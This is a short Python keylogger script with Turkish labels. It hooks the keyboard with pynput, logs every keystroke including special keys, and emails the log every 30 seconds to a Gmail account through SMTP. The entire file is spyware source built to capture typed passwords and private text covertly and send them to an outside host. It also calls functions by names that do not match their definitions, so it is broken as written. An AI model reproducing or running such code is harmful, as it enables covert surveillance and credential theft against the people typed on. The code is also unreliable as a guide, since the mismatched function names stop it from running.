import pynput.keyboard
import smtplib
import threading

log = ""

def callback_func(key):
    global log
    try:
        #log = log + key.char.encode('utf-8')
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        if key == key.tab:
            log = log + " Tab'a bastı. "
        if key == key.enter:
            log = log + " Enter'a bastı. "
        if key == key.backspace:
            log = log + " son karakteri sildi "
        else:
            log = log + str(key)
    except:
        pass

    print(log)

def send_email(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()

#thread - threading

def thread_function():
    global log
    send_email("user@gmail.com", "password", log.encode('utf-8'))
    log = ""
    timer_object = threading.Timer(30,thread_func)
    timer_object.start()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    thread_function()
    keylogger_listener.join()
